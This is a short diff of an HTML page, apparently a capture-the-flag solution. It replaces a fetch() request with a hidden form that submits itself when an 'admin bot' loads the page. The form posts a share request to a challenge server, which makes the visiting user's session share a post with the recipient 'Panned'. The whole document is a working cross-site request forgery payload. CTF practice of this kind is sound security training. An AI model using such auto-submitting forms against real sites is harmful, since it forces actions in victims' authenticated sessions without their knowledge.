@@ -1,14 +1,14 @@
 <html>
   <body>
+    <h1>Processing...</h1>
+    <form id="exploitForm" action="http://chall.sigx.net:3104/posts/share" method="POST">
+      <input type="hidden" name="id" value="b05fa630-c18e-11ed-92b6-005d69fad115">
+      <input type="hidden" name="recipient" value="Panned">
+    </form>
+
     <script>
-      fetch('http://chall.sigx.net:3104/posts/share', {
-        method: 'POST',
-        mode: 'no-cors',
-        headers: {
-          'Content-Type': 'application/x-www-form-urlencoded',
-        },
-        body: 'id=b05fa630-c18e-11ed-92b6-005d69fad115&recipient=Panned'
-      });
+      // Automatically submit the form as soon as the admin bot loads the page
+      document.getElementById('exploitForm').submit();
     </script>
   </body>
 </html>
